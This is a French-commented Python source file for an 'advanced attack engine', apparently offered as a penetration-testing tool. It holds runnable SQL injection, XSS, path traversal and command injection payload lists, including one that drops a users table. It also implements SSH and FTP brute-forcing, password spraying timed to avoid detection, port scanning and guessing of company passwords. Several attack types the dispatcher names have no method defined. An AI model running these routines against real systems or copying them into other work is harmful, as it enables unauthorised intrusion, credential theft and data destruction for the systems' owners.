"""
Moteur d'attaque avancé avec des techniques d'intrusion sophistiquées
AVERTISSEMENT: À utiliser uniquement dans un cadre légal et éthique
"""

import requests
import time
import random
import threading
import sqlite3
import hashlib
import base64
import json
import urllib.parse
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.common.exceptions import TimeoutException, WebDriverException
import subprocess
import socket
import ssl
import paramiko
from ftplib import FTP
import telnetlib
import smtplib
from email.mime.text import MIMEText
import dns.resolver
import nmap
import concurrent.futures
from datetime import datetime, timedelta

class AdvancedAttackEngine:
    """
    Moteur d'attaque avancé pour tests de pénétration autorisés
    """
    
    def __init__(self):
        self.running = False
        self.results = []
        self.status = {
            "running": False,
            "attempts": 0,
            "found": False,
            "result": None,
            "start_time": None,
            "elapsed_time": 0,
            "rate": 0,
            "current_target": "",
            "attack_type": "",
            "vulnerabilities_found": [],
            "services_discovered": [],
            "credentials_found": []
        }
        
    def start_attack(self, attack_type, target_params):
        """Démarre une attaque selon le type spécifié"""
        self.running = True
        self.status["running"] = True
        self.status["start_time"] = time.time()
        self.status["attack_type"] = attack_type
        self.status["current_target"] = target_params.get("target", "")
        
        try:
            if attack_type == "sql_injection":
                self._sql_injection_attack(target_params)
            elif attack_type == "xss_attack":
                self._xss_attack(target_params)
            elif attack_type == "csrf_attack":
                self._csrf_attack(target_params)
            elif attack_type == "directory_traversal":
                self._directory_traversal_attack(target_params)
            elif attack_type == "command_injection":
                self._command_injection_attack(target_params)
            elif attack_type == "file_upload_bypass":
                self._file_upload_bypass_attack(target_params)
            elif attack_type == "session_hijacking":
                self._session_hijacking_attack(target_params)
            elif attack_type == "timing_attack":
                self._timing_attack(target_params)
            elif attack_type == "port_scan":
                self._port_scan_attack(target_params)
            elif attack_type == "service_enumeration":
                self._service_enumeration_attack(target_params)
            elif attack_type == "ssh_bruteforce":
                self._ssh_bruteforce_attack(target_params)
            elif attack_type == "ftp_bruteforce":
                self._ftp_bruteforce_attack(target_params)
            elif attack_type == "smtp_bruteforce":
                self._smtp_bruteforce_attack(target_params)
            elif attack_type == "web_crawler":
                self._web_crawler_attack(target_params)
            elif attack_type == "subdomain_enumeration":
                self._subdomain_enumeration_attack(target_params)
            elif attack_type == "dns_enumeration":
                self._dns_enumeration_attack(target_params)
            elif attack_type == "social_engineering":
                self._social_engineering_attack(target_params)
            elif attack_type == "password_spray":
                self._password_spray_attack(target_params)
            elif attack_type == "token_bruteforce":
                self._token_bruteforce_attack(target_params)
            elif attack_type == "api_fuzzing":
                self._api_fuzzing_attack(target_params)
            else:
                raise ValueError(f"Type d'attaque non supporté: {attack_type}")
                
        except Exception as e:
            self.status["result"] = f"Erreur: {str(e)}"
        finally:
            self.running = False
            self.status["running"] = False
            
    def _sql_injection_attack(self, params):
        """Attaque par injection SQL"""
        target_url = params.get("url")
        parameters = params.get("parameters", [])
        
        # Payloads SQL injection communs
        sql_payloads = [
            "' OR '1'='1",
            "' OR '1'='1' --",
            "' OR '1'='1' /*",
            "' UNION SELECT NULL--",
            "' UNION SELECT 1,2,3--",
            "' AND 1=1--",
            "' AND 1=2--",
            "admin'--",
            "admin'/*",
            "' OR 1=1#",
            "' OR 'x'='x",
            "') OR ('1'='1",
            "') OR ('1'='1'--",
            "1' OR '1'='1",
            "1' OR '1'='1'--",
            "' OR 'a'='a",
            "' OR 'a'='a'--",
            "') OR 'a'='a'--",
            "1 OR 1=1",
            "1 OR 1=1--",
            "' UNION ALL SELECT NULL--",
            "' UNION ALL SELECT 1,2,3,4,5--",
            "' AND (SELECT COUNT(*) FROM information_schema.tables)>0--",
            "' AND (SELECT COUNT(*) FROM sysobjects)>0--",
            "' AND (SELECT COUNT(*) FROM msysobjects)>0--",
            "'; EXEC xp_cmdshell('dir')--",
            "'; DROP TABLE users--",
            "' OR SLEEP(5)--",
            "' OR pg_sleep(5)--",
            "' WAITFOR DELAY '00:00:05'--"
        ]
        
        for param in parameters:
            for payload in sql_payloads:
                if not self.running:
                    break
                    
                self.status["attempts"] += 1
                self.status["current_target"] = f"{target_url}?{param}={payload}"
                
                try:
                    # Test avec GET
                    response = requests.get(
                        target_url,
                        params={param: payload},
                        timeout=10,
                        allow_redirects=False
                    )
                    
                    # Vérifier les signes d'injection SQL réussie
                    if self._check_sql_injection_success(response, payload):
                        vuln = {
                            "type": "SQL Injection",
                            "parameter": param,
                            "payload": payload,
                            "url": target_url,
                            "method": "GET",
                            "response_code": response.status_code,
                            "response_length": len(response.text)
                        }
                        self.status["vulnerabilities_found"].append(vuln)
                        
                    # Test avec POST
                    response = requests.post(
                        target_url,
                        data={param: payload},
                        timeout=10,
                        allow_redirects=False
                    )
                    
                    if self._check_sql_injection_success(response, payload):
                        vuln = {
                            "type": "SQL Injection",
                            "parameter": param,
                            "payload": payload,
                            "url": target_url,
                            "method": "POST",
                            "response_code": response.status_code,
                            "response_length": len(response.text)
                        }
                        self.status["vulnerabilities_found"].append(vuln)
                        
                except requests.RequestException:
                    continue
                    
                time.sleep(0.1)  # Éviter de surcharger le serveur
                
    def _check_sql_injection_success(self, response, payload):
        """Vérifie si l'injection SQL a réussi"""
        error_patterns = [
            "mysql_fetch_array",
            "ORA-01756",
            "Microsoft OLE DB Provider for ODBC Drivers",
            "PostgreSQL query failed",
            "Warning: mysql_",
            "valid MySQL result",
            "MySqlClient.",
            "PostgreSQL",
            "Warning: pg_",
            "valid PostgreSQL result",
            "Warning: oci_",
            "Microsoft JET Database",
            "ODBC Microsoft Access",
            "ODBC SQL Server Driver",
            "SQLServer JDBC Driver",
            "SqlException",
            "OleDbException",
            "ERROR: parser: parse error",
            "Unclosed quotation mark",
            "quoted string not properly terminated"
        ]
        
        response_text = response.text.lower()
        
        # Vérifier les erreurs de base de données
        for pattern in error_patterns:
            if pattern.lower() in response_text:
                return True
                
        # Vérifier les changements de comportement
        if "SLEEP" in payload.upper() or "WAITFOR" in payload.upper():
            # Pour les attaques de timing, vérifier le temps de réponse
            return response.elapsed.total_seconds() > 4
            
        return False
        
    def _xss_attack(self, params):
        """Attaque Cross-Site Scripting (XSS)"""
        target_url = params.get("url")
        parameters = params.get("parameters", [])
        
        xss_payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            "javascript:alert('XSS')",
            "<iframe src=javascript:alert('XSS')>",
            "<body onload=alert('XSS')>",
            "<input onfocus=alert('XSS') autofocus>",
            "<select onfocus=alert('XSS') autofocus>",
            "<textarea onfocus=alert('XSS') autofocus>",
            "<keygen onfocus=alert('XSS') autofocus>",
            "<video><source onerror=alert('XSS')>",
            "<audio src=x onerror=alert('XSS')>",
            "<details open ontoggle=alert('XSS')>",
            "<marquee onstart=alert('XSS')>",
            "'-alert('XSS')-'",
            "\";alert('XSS');//",
            "</script><script>alert('XSS')</script>",
            "<script>alert(String.fromCharCode(88,83,83))</script>",
            "<script>alert(/XSS/)</script>",
            "<script>alert`XSS`</script>"
        ]
        
        for param in parameters:
            for payload in xss_payloads:
                if not self.running:
                    break
                    
                self.status["attempts"] += 1
                self.status["current_target"] = f"{target_url}?{param}={payload}"
                
                try:
                    response = requests.get(
                        target_url,
                        params={param: payload},
                        timeout=10
                    )
                    
                    if payload in response.text:
                        vuln = {
                            "type": "XSS (Reflected)",
                            "parameter": param,
                            "payload": payload,
                            "url": target_url,
                            "response_code": response.status_code
                        }
                        self.status["vulnerabilities_found"].append(vuln)
                        
                except requests.RequestException:
                    continue
                    
                time.sleep(0.1)
                
    def _csrf_attack(self, params):
        """Attaque Cross-Site Request Forgery (CSRF)"""
        target_url = params.get("url")
        session_cookie = params.get("session_cookie")
        
        # Tenter de trouver des formulaires sans protection CSRF
        try:
            response = requests.get(target_url, timeout=10)
            
            # Rechercher des formulaires
            if "<form" in response.text.lower():
                # Vérifier l'absence de tokens CSRF
                csrf_tokens = ["csrf", "token", "_token", "authenticity_token"]
                has_csrf_protection = any(token in response.text.lower() for token in csrf_tokens)
                
                if not has_csrf_protection:
                    vuln = {
                        "type": "CSRF",
                        "url": target_url,
                        "description": "Formulaire sans protection CSRF détecté",
                        "response_code": response.status_code
                    }
                    self.status["vulnerabilities_found"].append(vuln)
                    
        except requests.RequestException:
            pass
            
    def _directory_traversal_attack(self, params):
        """Attaque de traversée de répertoires"""
        target_url = params.get("url")
        parameters = params.get("parameters", [])
        
        traversal_payloads = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
            "....//....//....//etc/passwd",
            "..%2f..%2f..%2fetc%2fpasswd",
            "..%252f..%252f..%252fetc%252fpasswd",
            "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd",
            "/etc/passwd",
            "\\windows\\system32\\drivers\\etc\\hosts",
            "file:///etc/passwd",
            "file://c:\\windows\\system32\\drivers\\etc\\hosts"
        ]
        
        for param in parameters:
            for payload in traversal_payloads:
                if not self.running:
                    break
                    
                self.status["attempts"] += 1
                self.status["current_target"] = f"{target_url}?{param}={payload}"
                
                try:
                    response = requests.get(
                        target_url,
                        params={param: payload},
                        timeout=10
                    )
                    
                    # Vérifier les signes de traversée réussie
                    if self._check_directory_traversal_success(response):
                        vuln = {
                            "type": "Directory Traversal",
                            "parameter": param,
                            "payload": payload,
                            "url": target_url,
                            "response_code": response.status_code
                        }
                        self.status["vulnerabilities_found"].append(vuln)
                        
                except requests.RequestException:
                    continue
                    
                time.sleep(0.1)
                
    def _check_directory_traversal_success(self, response):
        """Vérifie si la traversée de répertoires a réussi"""
        indicators = [
            "root:x:",
            "daemon:x:",
            "bin:x:",
            "sys:x:",
            "# Copyright (c) 1993-2009 Microsoft Corp.",
            "# This is a sample HOSTS file",
            "[boot loader]",
            "[operating systems]"
        ]
        
        return any(indicator in response.text for indicator in indicators)
        
    def _command_injection_attack(self, params):
        """Attaque par injection de commandes"""
        target_url = params.get("url")
        parameters = params.get("parameters", [])
        
        command_payloads = [
            "; ls",
            "| ls",
            "& dir",
            "; cat /etc/passwd",
            "| cat /etc/passwd",
            "; whoami",
            "| whoami",
            "; id",
            "| id",
            "; uname -a",
            "| uname -a",
            "`ls`",
            "$(ls)",
            "; sleep 5",
            "| sleep 5",
            "; ping -c 4 127.0.0.1",
            "| ping -c 4 127.0.0.1"
        ]
        
        for param in parameters:
            for payload in command_payloads:
                if not self.running:
                    break
                    
                self.status["attempts"] += 1
                self.status["current_target"] = f"{target_url}?{param}={payload}"
                
                try:
                    start_time = time.time()
                    response = requests.get(
                        target_url,
                        params={param: payload},
                        timeout=15
                    )
                    response_time = time.time() - start_time
                    
                    # Vérifier les signes d'injection de commandes
                    if self._check_command_injection_success(response, payload, response_time):
                        vuln = {
                            "type": "Command Injection",
                            "parameter": param,
                            "payload": payload,
                            "url": target_url,
                            "response_code": response.status_code,
                            "response_time": response_time
                        }
                        self.status["vulnerabilities_found"].append(vuln)
                        
                except requests.RequestException:
                    continue
                    
                time.sleep(0.1)
                
    def _check_command_injection_success(self, response, payload, response_time):
        """Vérifie si l'injection de commandes a réussi"""
        # Vérifier les commandes de timing
        if "sleep" in payload.lower() and response_time > 4:
            return True
            
        # Vérifier les sorties de commandes communes
        command_outputs = [
            "uid=",
            "gid=",
            "groups=",
            "Linux",
            "Darwin",
            "Windows",
            "total ",
            "drwx",
            "-rw-",
            "Volume in drive",
            "Directory of"
        ]
        
        return any(output in response.text for output in command_outputs)
        
    def _port_scan_attack(self, params):
        """Scan de ports avec nmap"""
        target_host = params.get("host")
        port_range = params.get("port_range", "1-1000")
        
        try:
            nm = nmap.PortScanner()
            result = nm.scan(target_host, port_range)
            
            for host in nm.all_hosts():
                for protocol in nm[host].all_protocols():
                    ports = nm[host][protocol].keys()
                    for port in ports:
                        state = nm[host][protocol][port]['state']
                        if state == 'open':
                            service = {
                                "host": host,
                                "port": port,
                                "protocol": protocol,
                                "state": state,
                                "service": nm[host][protocol][port].get('name', 'unknown')
                            }
                            self.status["services_discovered"].append(service)
                            
        except Exception as e:
            self.status["result"] = f"Erreur lors du scan de ports: {str(e)}"
            
    def _ssh_bruteforce_attack(self, params):
        """Attaque par force brute SSH"""
        target_host = params.get("host")
        target_port = params.get("port", 22)
        usernames = params.get("usernames", ["root", "admin", "user"])
        passwords = params.get("passwords", ["password", "123456", "admin"])
        
        for username in usernames:
            for password in passwords:
                if not self.running:
                    break
                    
                self.status["attempts"] += 1
                self.status["current_target"] = f"{username}@{target_host}:{target_port}"
                
                try:
                    ssh = paramiko.SSHClient()
                    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                    ssh.connect(
                        target_host,
                        port=target_port,
                        username=username,
                        password=password,
                        timeout=5
                    )
                    
                    # Connexion réussie
                    cred = {
                        "service": "SSH",
                        "host": target_host,
                        "port": target_port,
                        "username": username,
                        "password": password
                    }
                    self.status["credentials_found"].append(cred)
                    ssh.close()
                    
                except paramiko.AuthenticationException:
                    continue
                except Exception:
                    continue
                    
                time.sleep(1)  # Éviter de déclencher des protections anti-brute force
                
    def _ftp_bruteforce_attack(self, params):
        """Attaque par force brute FTP"""
        target_host = params.get("host")
        target_port = params.get("port", 21)
        usernames = params.get("usernames", ["anonymous", "ftp", "admin"])
        passwords = params.get("passwords", ["", "ftp", "admin"])
        
        for username in usernames:
            for password in passwords:
                if not self.running:
                    break
                    
                self.status["attempts"] += 1
                self.status["current_target"] = f"{username}@{target_host}:{target_port}"
                
                try:
                    ftp = FTP()
                    ftp.connect(target_host, target_port, timeout=5)
                    ftp.login(username, password)
                    
                    # Connexion réussie
                    cred = {
                        "service": "FTP",
                        "host": target_host,
                        "port": target_port,
                        "username": username,
                        "password": password
                    }
                    self.status["credentials_found"].append(cred)
                    ftp.quit()
                    
                except Exception:
                    continue
                    
                time.sleep(1)
                
    def _subdomain_enumeration_attack(self, params):
        """Énumération de sous-domaines"""
        target_domain = params.get("domain")
        wordlist = params.get("wordlist", [
            "www", "mail", "ftp", "admin", "test", "dev", "staging",
            "api", "app", "blog", "shop", "store", "support", "help"
        ])
        
        for subdomain in wordlist:
            if not self.running:
                break
                
            full_domain = f"{subdomain}.{target_domain}"
            self.status["attempts"] += 1
            self.status["current_target"] = full_domain
            
            try:
                # Test de résolution DNS
                dns.resolver.resolve(full_domain, 'A')
                
                # Test de connectivité HTTP
                try:
                    response = requests.get(f"http://{full_domain}", timeout=5)
                    service = {
                        "subdomain": full_domain,
                        "status": "active",
                        "http_status": response.status_code,
                        "title": self._extract_title(response.text)
                    }
                    self.status["services_discovered"].append(service)
                except:
                    service = {
                        "subdomain": full_domain,
                        "status": "dns_only"
                    }
                    self.status["services_discovered"].append(service)
                    
            except dns.resolver.NXDOMAIN:
                continue
            except Exception:
                continue
                
            time.sleep(0.1)
            
    def _extract_title(self, html):
        """Extrait le titre d'une page HTML"""
        try:
            start = html.lower().find('<title>') + 7
            end = html.lower().find('</title>')
            if start > 6 and end > start:
                return html[start:end].strip()
        except:
            pass
        return ""
        
    def _timing_attack(self, params):
        """Attaque par timing pour détecter des vulnérabilités"""
        target_url = params.get("url")
        parameters = params.get("parameters", [])
        
        timing_payloads = [
            "'; WAITFOR DELAY '00:00:05'--",
            "' OR SLEEP(5)--",
            "' OR pg_sleep(5)--",
            "'; SELECT SLEEP(5)--",
            "' UNION SELECT SLEEP(5)--"
        ]
        
        for param in parameters:
            # Mesurer le temps de réponse normal
            try:
                start_time = time.time()
                requests.get(target_url, params={param: "normal"}, timeout=10)
                normal_time = time.time() - start_time
            except:
                normal_time = 1.0
                
            for payload in timing_payloads:
                if not self.running:
                    break
                    
                self.status["attempts"] += 1
                self.status["current_target"] = f"{target_url}?{param}={payload}"
                
                try:
                    start_time = time.time()
                    response = requests.get(
                        target_url,
                        params={param: payload},
                        timeout=15
                    )
                    response_time = time.time() - start_time
                    
                    # Si le temps de réponse est significativement plus long
                    if response_time > normal_time + 4:
                        vuln = {
                            "type": "Timing Attack (Possible SQL Injection)",
                            "parameter": param,
                            "payload": payload,
                            "url": target_url,
                            "normal_time": normal_time,
                            "attack_time": response_time,
                            "delay_detected": response_time - normal_time
                        }
                        self.status["vulnerabilities_found"].append(vuln)
                        
                except requests.RequestException:
                    continue
                    
                time.sleep(0.5)
                
    def _password_spray_attack(self, params):
        """Attaque par pulvérisation de mots de passe"""
        target_url = params.get("url")
        usernames = params.get("usernames", [])
        passwords = params.get("passwords", ["password", "123456", "admin"])
        
        # Utiliser un seul mot de passe contre tous les utilisateurs
        for password in passwords:
            for username in usernames:
                if not self.running:
                    break
                    
                self.status["attempts"] += 1
                self.status["current_target"] = f"{username}:{password}"
                
                try:
                    response = requests.post(
                        target_url,
                        data={"username": username, "password": password},
                        timeout=10,
                        allow_redirects=False
                    )
                    
                    # Vérifier les signes de connexion réussie
                    if self._check_login_success(response):
                        cred = {
                            "service": "Web Login",
                            "url": target_url,
                            "username": username,
                            "password": password,
                            "response_code": response.status_code
                        }
                        self.status["credentials_found"].append(cred)
                        
                except requests.RequestException:
                    continue
                    
                time.sleep(2)  # Délai entre les tentatives pour éviter la détection
                
            time.sleep(10)  # Délai plus long entre les mots de passe
            
    def _check_login_success(self, response):
        """Vérifie si la connexion a réussi"""
        success_indicators = [
            "dashboard",
            "welcome",
            "logout",
            "profile",
            "settings"
        ]
        
        failure_indicators = [
            "invalid",
            "incorrect",
            "failed",
            "error",
            "denied"
        ]
        
        response_text = response.text.lower()
        
        # Vérifier les redirections (souvent signe de succès)
        if response.status_code in [301, 302, 303, 307, 308]:
            return True
            
        # Vérifier les indicateurs de succès
        if any(indicator in response_text for indicator in success_indicators):
            return True
            
        # Vérifier l'absence d'indicateurs d'échec
        if not any(indicator in response_text for indicator in failure_indicators):
            return True
            
        return False
        
    def _api_fuzzing_attack(self, params):
        """Fuzzing d'API pour découvrir des endpoints"""
        base_url = params.get("base_url")
        endpoints = params.get("endpoints", [
            "/api/v1/users",
            "/api/v1/admin",
            "/api/v1/config",
            "/api/users",
            "/api/admin",
            "/admin",
            "/config",
            "/status",
            "/health",
            "/debug"
        ])
        
        for endpoint in endpoints:
            if not self.running:
                break
                
            full_url = f"{base_url.rstrip('/')}{endpoint}"
            self.status["attempts"] += 1
            self.status["current_target"] = full_url
            
            for method in ["GET", "POST", "PUT", "DELETE", "OPTIONS"]:
                try:
                    response = requests.request(method, full_url, timeout=5)
                    
                    if response.status_code != 404:
                        service = {
                            "type": "API Endpoint",
                            "url": full_url,
                            "method": method,
                            "status_code": response.status_code,
                            "content_length": len(response.text),
                            "content_type": response.headers.get("content-type", "")
                        }
                        self.status["services_discovered"].append(service)
                        
                except requests.RequestException:
                    continue
                    
            time.sleep(0.1)
            
    def _social_engineering_attack(self, params):
        """Simulation d'attaque d'ingénierie sociale"""
        target_domain = params.get("domain")
        
        # Recherche d'informations publiques
        search_queries = [
            f"site:{target_domain} email",
            f"site:{target_domain} contact",
            f"site:{target_domain} staff",
            f"site:{target_domain} employee",
            f"\"{target_domain}\" linkedin",
            f"\"{target_domain}\" facebook"
        ]
        
        # Simulation de collecte d'informations
        for query in search_queries:
            if not self.running:
                break
                
            self.status["attempts"] += 1
            self.status["current_target"] = query
            
            # Simulation de recherche (ne fait pas de vraies requêtes)
            time.sleep(1)
            
        # Génération de mots de passe probables basés sur le domaine
        company_name = target_domain.split('.')[0]
        current_year = datetime.now().year
        
        probable_passwords = [
            f"{company_name}123",
            f"{company_name}{current_year}",
            f"{company_name.capitalize()}123",
            f"{company_name.upper()}123",
            f"Welcome{current_year}",
            f"Password{current_year}",
            f"{company_name}!",
            f"{company_name}@{current_year}"
        ]
        
        social_info = {
            "type": "Social Engineering Intelligence",
            "domain": target_domain,
            "probable_passwords": probable_passwords,
            "company_name": company_name,
            "current_year": current_year
        }
        
        self.status["services_discovered"].append(social_info)
        
    def stop_attack(self):
        """Arrête l'attaque en cours"""
        self.running = False
        self.status["running"] = False
        
    def get_status(self):
        """Retourne le statut actuel de l'attaque"""
        if self.status["start_time"]:
            self.status["elapsed_time"] = time.time() - self.status["start_time"]
            if self.status["elapsed_time"] > 0:
                self.status["rate"] = self.status["attempts"] / self.status["elapsed_time"]
                
        return self.status.copy()

